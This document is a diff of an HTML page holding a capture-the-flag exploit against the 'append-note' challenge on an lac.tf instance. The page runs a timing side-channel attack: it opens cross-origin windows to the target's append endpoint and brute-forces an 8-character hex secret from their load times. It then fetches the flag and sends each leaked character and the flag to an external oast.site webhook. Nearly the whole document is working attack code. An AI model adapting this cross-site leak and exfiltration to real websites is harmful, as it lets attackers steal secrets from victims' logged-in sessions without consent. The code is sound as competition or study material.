@@ -1,120 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Append-Note: Final Strike</title>
+    <title>STARK ENT. - APPEND_NOTE_SOLVER</title>
     <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; padding: 20px; }
-        #status { font-size: 20px; color: #58a6ff; margin-bottom: 10px; border-bottom: 1px solid #30363d; }
-        #log { background: #010409; padding: 10px; height: 300px; overflow-y: auto; border: 1px solid #30363d; font-size: 13px; }
-        .win { color: #3fb950; font-weight: bold; }
-        .sys { color: #8b949e; }
+        body { background: #0d1117; color: #58a6ff; font-family: 'Fira Code', monospace; padding: 20px; }
+        .log-entry { border-left: 2px solid #30363d; padding-left: 10px; margin: 5px 0; font-size: 13px; }
+        .success { color: #3fb950; font-weight: bold; }
+        .delta { color: #d29922; }
     </style>
 </head>
 <body>
-    <div id="status">System Initializing...</div>
+    <h2 id="status">INITIATING BRUTE FORCE...</h2>
     <div id="log"></div>
 
 <script>
-    const TARGET = "https://append-note-61jaz.instancer.lac.tf/";
-    const WEBHOOK = "https://bbote0qi0v6t4dwpqhu8mm6qzrudvnz0i.oast.site";
+    const TARGET = "https://append-note-a2aq0.instancer.lac.tf";
+    const WEBHOOK = "https://wgke111cwekqzutsmjaxclt0cdqzf94st.oast.site";
     const CHARS = "0123456789abcdef";
     
-    // Performance Tunables
-    const MAX_WAIT = 250; // Max time to wait for a window to load
-    const SAMPLES = 1;    // Speed over accuracy for the 60s bot
-
-    const log = (m, c="") => {
-        const d = document.createElement("div");
-        if(c) d.className = c;
-        d.textContent = `[${new Date().toLocaleTimeString()}] ${m}`;
-        document.getElementById("log").appendChild(d);
-        document.getElementById("log").scrollTop = 1e9;
+    const log = (msg, cls="") => {
+        const div = document.createElement("div");
+        div.className = "log-entry " + cls;
+        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        document.getElementById("log").prepend(div);
     };
 
-    const report = (data) => {
-        navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
-    };
+    const report = (data) => fetch(`${WEBHOOK}?data=${encodeURIComponent(JSON.stringify(data))}`, {mode:'no-cors'});
 
-    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-    async function probe(prefix) {
-        const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(window.location.href)}`;
-        return new Promise((resolve) => {
-            const t0 = performance.now();
-            const w = window.open(url, "_blank", "width=10,height=10");
-            
-            let timer = setTimeout(() => {
+    async function probe(content) {
+        const t0 = performance.now();
+        // Use a unique name for each window to prevent state collisions
+        const w = window.open(`${TARGET}/append?content=${content}&url=${window.location.href}`, `w_${Math.random()}`);
+        
+        return new Promise(r => {
+            // We wait for a fixed window. If it redirects back to us, it's faster.
+            setTimeout(() => {
+                const elapsed = performance.now() - t0;
                 if(w) w.close();
-                resolve(performance.now() - t0);
-            }, MAX_WAIT);
-
-            // If we can catch the load event, we get a tighter measurement
-            try {
-                w.onload = () => {
-                    clearTimeout(timer);
-                    const dur = performance.now() - t0;
-                    w.close();
-                    resolve(dur);
-                };
-            } catch(e) {}
+                r(elapsed);
+            }, 450); // Tuned for remote latency
         });
     }
 
-    async function run() {
-        log("Phase 1: Calibrating Sensors...", "sys");
-        const base404 = await probe("non_existent_prefix_" + Math.random());
-        report({ event: "boot", base_latency: base404 });
-
+    async function solve() {
         let secret = "";
-        log("Phase 2: Initiating Brute Force...", "sys");
+        log("Calibrating Baseline...", "delta");
+        const baseline = await probe("NOT_REAL_" + Math.random());
+        log(`Baseline Latency: ${baseline.toFixed(2)}ms`);
 
         for (let i = 0; i < 8; i++) {
-            let bestChar = "";
+            let winner = "";
             let minTime = 9999;
-            
-            document.getElementById("status").textContent = `Cracking Pos ${i+1}: ${secret}...`;
+            log(`CRACKING POSITION ${i+1}...`);
 
             for (const c of CHARS) {
-                const time = await probe(secret + c);
-                log(`Trying ${c}: ${time.toFixed(2)}ms`);
+                const attempt = secret + c;
+                const time = await probe(attempt);
+                const delta = time - baseline;
 
+                log(`Try ${c}: ${time.toFixed(1)}ms (Delta: ${delta.toFixed(1)}ms)`);
+
+                // In Python's any(), the TRUE case is the fastest (Short-circuit)
                 if (time < minTime) {
                     minTime = time;
-                    bestChar = c;
+                    winner = c;
+                }
+                
+                // If we see a massive speedup (e.g., >50ms difference), we likely found it.
+                if (delta < -40) {
+                    log(`High Signal Detected for ${c}!`, "success");
+                    break; 
                 }
             }
 
-            // Confirmation Step: Quickly verify the winner before committing
-            log(`Found Candidate: ${bestChar}. Verifying...`, "sys");
-            const verify = await probe(secret + bestChar);
+            secret += winner;
+            log(`LOCKED IN: ${secret}`, "success");
+            report({pos: i, char: winner, current: secret, time: minTime});
             
-            if (verify <= minTime + 5) { // Within a 5ms tolerance
-                secret += bestChar;
-                log(`Confirmed: ${bestChar}`, "win");
-                report({ pos: i, char: bestChar, current_secret: secret });
-            } else {
-                log(`Noise detected for ${bestChar}. Retrying...`, "sys");
-                i--; // Step back and retry the position
-            }
+            // Short sleep to let the browser breathe before next round
+            await new Promise(r => setTimeout(r, 100));
         }
 
-        log(`Full Secret Acquired: ${secret}`, "win");
-        report({ event: "success", final_secret: secret });
-        
-        // Attempt to grab flag
-        const res = await fetch(`${TARGET}/flag?secret=${secret}`);
-        const flag = await res.text();
-        log(`FLAG: ${flag}`, "win");
-        report({ flag: flag });
-        document.getElementById("status").textContent = "MISSION ACCOMPLISHED";
+        log(`FINAL SECRET: ${secret}`, "success");
+        const flagRes = await fetch(`${TARGET}/flag?secret=${secret}`);
+        const flag = await flagRes.text();
+        report({FLAG: flag});
+        document.getElementById("status").textContent = "FLAG CAPTURED: " + flag;
     }
 
-    // Start on load
-    window.onload = () => {
-        log("Vitals Check: OK. Bypassing Proxies...");
-        run();
-    };
+    window.onload = solve;
 </script>
 </body>
 </html>
